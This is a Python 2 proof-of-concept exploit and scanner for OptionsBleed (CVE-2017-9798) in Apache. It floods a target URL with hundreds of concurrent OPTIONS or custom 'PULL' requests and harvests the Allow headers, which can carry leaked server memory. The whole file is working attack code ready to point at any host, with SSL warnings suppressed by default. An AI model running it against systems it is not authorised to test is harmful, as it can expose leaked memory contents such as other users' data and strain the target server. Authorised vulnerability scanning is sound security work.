# OptionsBleed (CVE-2017-9798) PoC / Scanner
# br0k3ns0und
# zeroex00.com

import requests
import argparse
from threading import Thread
from requests.packages.urllib3.exceptions import InsecureRequestWarning


parser = argparse.ArgumentParser()
parser.add_argument('url', type=str, help='full URL (including http(s)) to be scanned')
parser.add_argument('-c', '--count', type=int, default=1000, help='number of times to scan (default: 1000)')
parser.add_argument('-f', '--force', type=str, choices={'option', 'custom'},
            help='forces the scan to attempt using custom verb method OR OPTIONS (default: try OPTIONS THEN custom)')
parser.add_argument('-tc', '--thread-count', type=int, default=500, help='max concurrent thread count (default: 500)')
parser.add_argument('-nv', '--no-verify', action='store_false', default=True,
                    help='does not verify ssl connection (may be necessary for self-signed certs)')
parser.add_argument('-ni', '--no-ignore', action='store_true', help='does NOT ignore ssl warnings (default: ignored)')
parser.add_argument('-v', '--verbose', action='store_true', help='prints all headers')
parser.add_argument('-e', '--errors', action='store_true', help='prints all errors')
args = parser.parse_args()

if not args.no_ignore:
    requests.packages.urllib3.disable_warnings(InsecureRequestWarning)


def does_it_bleed(url, method, verify=True):
    header = {'user-agent': 'Mozilla'}
    r = ''
    print '[+] checking {0} method'.format(method.upper())
    try:
        if method == 'option':
            r = requests.options(url, headers=header, verify=verify, timeout=5)
        elif method == 'custom':
            r = requests.request('PULL', url, headers=header, verify=verify, timeout=5)
        else:
            print '[!] invalid method!'
            return False
    except requests.exceptions.ConnectionError:
        print '[!] connection error!'
        return False
    except requests.exceptions.ReadTimeout:
        print '[!] connection timed out!'
        return False
    # TODO: SSL verify exception
    low_headers = map(lambda x: x.lower(), r.headers.keys())
    if args.verbose:
        print '[*] VERBOSE: \n\t-raw {0} headers: \n\t{1} \n\t-low {0} headers: \n\t{2}'.format(
            method.upper(), ' '.join(r.headers.keys()), ' '.join(low_headers))
    if 'allow' in low_headers:
        print '[+] allow headers detected in {0} response'.format(method.upper())
        return True


def bleed(url, method='option', verify=True):
    header = {'user-agent': 'Mozilla'}
    try:
        if method == 'custom':
            r = requests.request('PULL', url, headers=header, verify=verify, timeout=2)
        else:
            r = requests.options(url, headers=header, verify=verify, timeout=2)
    except Exception as e:
        errors.append(str(e.message))
        return
    results.append(r.headers.get('Allow'))


def hemorrhage(count, bleed_method, thread_count=None):
    for i in xrange(count):
        t = Thread(target=bleed, args=(args.url, bleed_method, not args.no_verify))
        threads.append(t)
        t.start()
    for _thread in threads:
        _thread.join()


def main():
    print '\n\t::OptionsBleed (CVE-2017-9798) Scanner::\n'
    print '[+] scanning {} to see if it bleeds!'.format(args.url)

    if args.force:
        if does_it_bleed(args.url, args.force):
            hemorrhage(args.count, args.force)
        else:
            print '[+] allow header NOT detected'
            exit(1)
    else:
        options_test = does_it_bleed(args.url, 'option')
        custom_test = does_it_bleed(args.url, 'custom')
        method_count = 1
        if options_test and custom_test:
            method_count = 2
        if options_test:
            print '[+] scanning with OPTIONS method...'
            hemorrhage(args.count / method_count, 'option')
        if custom_test:
            print '[+] scanning with custom (PULL) method...'
            hemorrhage(args.count / method_count, 'custom')
        if not options_test and not custom_test:
            print '[+] allow header NOT detected'
            exit(1)

    print '[+] {0} responses captured'.format(len(results))
    print '[+] unique results: \n{0}'.format('\n'.join(list(set(results))))
    if args.errors:
        print '[+] {0} errors captured'.format(len(errors))
        print '[+] unique errors:\n{0}'.format('\n'.join(list(set(errors))))
    print '[+] scan complete!'


if __name__ == '__main__':
    threads = []
    results = []
    errors = []
    main()
